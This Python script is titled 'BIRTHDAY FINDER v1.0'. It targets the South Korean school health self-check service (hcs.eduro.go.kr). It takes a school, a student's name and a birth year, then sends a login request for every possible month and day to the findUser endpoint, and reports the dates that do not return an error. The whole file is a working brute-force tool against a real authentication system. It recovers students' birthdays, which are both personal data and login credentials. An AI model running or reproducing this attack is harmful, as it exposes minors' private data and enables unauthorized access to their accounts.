import os
import requests
from hcskr.mapping import encrypt
from hcskr.mapping import schoolinfo


def find_school(lctnScCode, schulCrseScCode, orgName):
    data = {
        'lctnScCode': lctnScCode,
        'schulCrseScCode': schulCrseScCode,
        'orgName': orgName,
        'loginType': 'school'
    }
    '''
        data = {
        'lctnScCode': '01',
        'schulCrseScCode': 3,
        'orgName': '장승중학교',
        'loginType': 'school'
    }
    '''

    res = requests.get('https://hcs.eduro.go.kr/v2/searchSchool', data).json()
    return res['schulList'][0]


def login(domain, birth, name, orgCode):
    data = {
        'birthday': encrypt(birth),
        'loginType': 'school',
        'name': encrypt(name),
        'orgCode': orgCode,
        'stdntPNo': None
    }

    res = requests.post(f'https://{domain}hcs.eduro.go.kr/v2/findUser', json=data).json()
    return res


def find_birth(domain, orgCode, name, birth_year):
    final = []
    for month in range(12):
        print(f'Searching {month + 1}월...')
        for day in range(31):
            result = login(domain, f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}', name, orgCode)
            try:
                _ = result['isError']
            except KeyError:
                print(f'[!]Birthday found: {month + 1}월 {day + 1}일')
                final.append([month + 1, day + 1])
                
    print('Searching finished!')
    print('')

    print('=====Result=====')
    
    for i, birth in enumerate(final):
        print(f'{i + 1}: {str(birth_year).zfill(2)}{str(birth[0]).zfill(2)}{str(birth[1]).zfill(2)}')

    print('')


print('')
print('BIRTHDAY FINDER v1.0')
print('')
area = str(input('area(ex. 서울): '))
level = str(input('school(ex 중학교): '))
school_name = str(input('school name(ex. 장승중학교): '))
name = str(input('name: '))
birth = int(input('birth year(ex. 7): '))
print('')
school_info = schoolinfo(area, level)

find_birth(school_info['schoolurl'], find_school(school_info['schoolcode'], school_info['schoollevel'], school_name)['orgCode'], name, birth)
